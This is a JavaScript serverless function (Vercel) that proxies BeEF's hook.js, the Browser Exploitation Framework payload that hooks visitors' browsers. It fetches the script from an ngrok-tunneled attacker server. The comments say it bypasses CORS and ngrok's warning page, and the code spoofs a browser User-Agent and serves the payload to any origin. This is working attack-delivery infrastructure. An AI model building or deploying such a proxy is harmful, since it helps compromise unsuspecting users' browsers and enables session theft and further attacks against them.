/**
 * Vercel Serverless Function - Proxy for BeEF hook.js
 * Bypasses CORS and ngrok warnings by fetching hook.js server-side
 */

export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Content-Type", "application/javascript");
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate");

  if (req.method === "OPTIONS") {
    res.status(200).end();
    return;
  }

  if (req.method !== "GET") {
    res.status(405).json({ error: "Method not allowed" });
    return;
  }

  const beefServerUrl = process.env.BEEF_SERVER_URL;

  if (!beefServerUrl) {
    console.error("BEEF_SERVER_URL environment variable not set");
    res
      .status(500)
      .send("// Configuration error: BeEF server URL not configured");
    return;
  }

  try {
    // Fetch hook.js from BeEF server with ngrok bypass headers
    const response = await fetch(`${beefServerUrl}/hook.js`, {
      headers: {
        "ngrok-skip-browser-warning": "true",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
    });

    if (!response.ok) {
      console.error(
        `Failed to fetch hook.js: ${response.status} ${response.statusText}`
      );
      res.status(502).send(`// Failed to fetch hook.js from BeEF server`);
      return;
    }

    const hookScript = await response.text();

    // Return the hook.js content
    res.status(200).send(hookScript);
  } catch (error) {
    console.error("Error fetching hook.js:", error.message);
    res.status(502).send(`// Error: ${error.message}`);
  }
}
